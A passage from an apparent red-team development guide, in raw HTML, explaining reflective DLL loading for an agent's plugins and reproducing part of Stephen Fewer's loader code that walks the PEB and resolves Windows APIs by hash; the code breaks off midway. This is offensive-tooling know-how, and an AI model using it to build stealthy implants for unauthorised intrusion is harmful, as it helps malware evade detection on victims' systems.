text-start self-start justify-start">The agent constructs an <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IPlugin</code> and calls <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">init → execute(task) → cleanup</code>.<!-- --></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'5.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Output goes wherever you’ve decided (console, buffers, whatever fits your world).</p></div></li></ol><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">One important note: you’re replacing the <strong class="font-bold">loader’s mapping</strong> steps for <i class="font-italic">this</i> in-memory image. You can still lean on OS APIs to satisfy that image’s imports. Think “a custom mapper for this module,” not “banish <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">LoadLibrary</code> forever.”</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="the-journey" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#the-journey"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_9d8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9d8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">The Journey</div></h2><h3 id="what-is-reflective-dll-loading" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#what-is-reflective-dll-loading"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_9f8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9f8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">What is Reflective DLL Loading?</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">It’s basically the OS loader, but by hand: parse headers, copy sections, apply relocations, resolve imports, set protections, maybe run the DLLEntry—and do it all from a byte buffer you already have. Same puzzle, different pieces.</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="where-to-start" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#where-to-start"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_9l8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9l8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Where to start?</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">First, let's look at Stephen Fewer's implementation from more than a decade ago. First, process exports for the functions the loader needs:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1p8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// STEP 1: process the kernels exports for the functions our loader needs...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">// get the Process Enviroment Block<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef WIN_X64<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiBaseAddress = __readgsqword(0x60);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef WIN_X86<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiBaseAddress = __readfsdword(0x30);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else WIN_ARM<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiBaseAddress = *(DWORD*)((BYTE*)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; ULONG_PTR kernel32BaseAddress = (ULONG_PTR)NULL;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)-&gt;pLdr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // get the first entry of the InMemoryOrder module list<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)-&gt;InMemoryOrderModuleList.Flink;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; while (uiValueA)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // get pointer to current modules name (unicode string)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.pBuffer;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // set bCounter to the length for the loop<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;BaseDllName.Length;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // clear uiValueC which will store the hash of the module name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueC = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // compute the hash of the module name...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; do<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueC = ror((DWORD)uiValueC);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // normalize to uppercase if the module name is in lowercase<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (*((BYTE*)uiValueB) &gt;= 'a')<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueC += *((BYTE*)uiValueB) - 0x20;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueC += *((BYTE*)uiValueB);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueB++;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; } while (--usCounter);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // compare the hash with that of kernel32.dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if ((DWORD)uiValueC == KERNEL32DLL_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get this modules base address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;DllBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kernel32BaseAddress = uiBaseAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the modules NT Header<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiNameArray = the address of the modules export directory entry<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray = (ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the export directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of name pointers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of name ordinals<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Number of imports to resolve<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usCounter = 4;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // loop while we still have imports to find<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while (usCounter &gt; 0)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // compute the hash values for this function name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // if we have found a function we want we get its virtual address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (dwHashValue == LOADLIBRARYA_HASH<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || dwHashValue == GETPROCADDRESS_HASH<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || dwHashValue == VIRTUALALLOC_HASH<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; || dwHashValue == VIRTUALPROTECT_HASH<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of addresses<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // use this functions name ordinal as an index into the array of name pointers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // store this functions VA<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (dwHashValue == LOADLIBRARYA_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (dwHashValue == GETPROCADDRESS_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (dwHashValue == VIRTUALALLOC_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (dwHashValue == VIRTUALPROTECT_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pVirtualProtect = (VIRTUALPROTECT)(uiBaseAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // decrement our counter<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usCounter--;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next exported function name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray += sizeof(DWORD);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next exported function name ordinal<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameOrdinals += sizeof(WORD);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; else if ((DWORD)uiValueC == NTDLLDLL_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get this modules base address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)-&gt;DllBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the modules NT Header<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiNameArray = the address of the modules export directory entry<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray = (ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the export directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of name pointers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of name ordinals<!-- -->
